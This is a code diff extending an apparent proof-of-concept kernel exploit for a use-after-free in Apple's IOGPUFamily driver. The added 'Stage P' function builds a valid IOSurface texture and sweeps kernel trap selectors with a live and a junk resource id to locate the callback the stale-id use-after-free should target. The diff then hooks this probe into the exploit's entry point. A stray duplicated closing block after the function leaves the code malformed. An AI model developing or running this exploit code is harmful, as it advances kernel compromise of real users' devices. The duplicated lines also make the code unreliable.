@@ -425,6 +425,65 @@ static void uaf_stage2(id<MTLDevice> dev, io_connect_t conn, uint32_t stale_id,
     }
 }
 
+/* ── Stage P — valid-resource identity probe ─────────────────────────────
+ * 23C55 static fact: o1 row 3 is a pure getter (reads [conn+248], fills the
+ * 8-byte out pair, returns 0) — the PoC's sel3 assumption is wrong for this
+ * build. The purgeable/setter surface for the resource list HIDES in some
+ * other trap slot: a handler whose answer depends on the resource id.
+ * Method: create one fully valid 1x1 IOSurface texture (validation clean,
+ * no overflow), then sweep sel 0..63 twice — once with live id=1, once with
+ * junk id=0xFFFFFF — and print every sel whose answers DIFFER. That sel is
+ * the resource-bound callback the stale-id machinery should visit. */
+static void stage_identity_probe(id<MTLDevice> dev, io_connect_t conn) {
+    printf("\n=== STAGE P - valid-resource identity probe ===\n");
+    if (!g_trap2) return;
+
+    int wl = 1, hl = 1; uint32_t bpl = 4; uint64_t bs = 4;
+    CFMutableDictionaryRef d =
+        CFDictionaryCreateMutable(nullptr, 0,
+                                  &kCFTypeDictionaryKeyCallBacks,
+                                  &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef wN  = CFNumberCreate(nullptr, kCFNumberIntType, &wl);
+    CFNumberRef hN  = CFNumberCreate(nullptr, kCFNumberIntType, &hl);
+    CFNumberRef bpN = CFNumberCreate(nullptr, kCFNumberIntType, &bpl);
+    CFNumberRef bsN = CFNumberCreate(nullptr, kCFNumberLongLongType, &bs);
+    CFDictionarySetValue(d, IOSurfacePropertyKey("IOSurfaceWidth"), wN);
+    CFDictionarySetValue(d, IOSurfacePropertyKey("IOSurfaceHeight"), hN);
+    CFDictionarySetValue(d, IOSurfacePropertyKey("IOSurfaceBytesPerRow"), bpN);
+    CFDictionarySetValue(d, IOSurfacePropertyKey("IOSurfaceAllocSize"), bsN);
+    IOSurfaceRef surf = IOSurfaceCreate(d);
+    CFRelease(wN); CFRelease(hN); CFRelease(bpN); CFRelease(bsN); CFRelease(d);
+    if (!surf) { printf("[probe-id] IOSurfaceCreate(1x1) failed\n"); return; }
+
+    MTLTextureDescriptor *desc = [MTLTextureDescriptor new];
+    desc.textureType       = MTLTextureType2D;
+    desc.pixelFormat       = MTLPixelFormatBGRA8Unorm;
+    desc.width             = 1;
+    desc.height            = 1;
+    desc.mipmapLevelCount  = 1;
+    desc.usage             = MTLTextureUsageShaderRead;
+    g_suppress_abort = 1; g_suppress_stride = 1;
+    id<MTLTexture> tex = [dev newTextureWithDescriptor:desc iosurface:surf plane:0];
+    g_suppress_abort = 0; g_suppress_stride = 0;
+    uint64_t allocsz = tex ? IOSurfaceGetAllocSize(surf) : 0;
+    CFRelease(surf);
+    printf("[probe-id] valid texture=%p allocsz=%llu\n",
+           (__bridge void*)tex, (unsigned long long)allocsz);
+    if (!tex) { nk_log("[probe-id] texture creation failed"); return; }
+
+    for (uint32_t sel = 0; sel < 64; sel++) {
+        kern_return_t ka = g_trap2(conn, sel, 1, 0);
+        kern_return_t kb = g_trap2(conn, sel, 0xFFFFFF, 0);
+        if (ka != kb) printf("[probe-sel] sel=%-2u id1=0x%-9x junk=0x%x  <- id-sensitive\n",
+                             sel, ka, kb);
+        else if (ka != (kern_return_t)0 && ka != (kern_return_t)0xe00002c2)
+            printf("[probe-sel] sel=%-2u const=0x%x\n", sel, ka);
+    }
+    printf("[probe-id] done\n");
+}
+    printf("[probe-id] done\n");
+}
+
 /* ── Entry point ─────────────────────────────────────────────────────────*/
 int poc_iogpu_uaf_run(void) {
     printf("=== CVE-2026-64788: IOGPUFamily UAF PoC ===\n");
@@ -467,6 +526,8 @@ int poc_iogpu_uaf_run(void) {
     printf("[+] resource conn=0x%x\n", conn);
 
     baseline_scan(conn);
+
+    stage_identity_probe(dev, conn);
 
     uint32_t stale_id = plant_uaf(dev, conn);
     if (!stale_id) return 1;
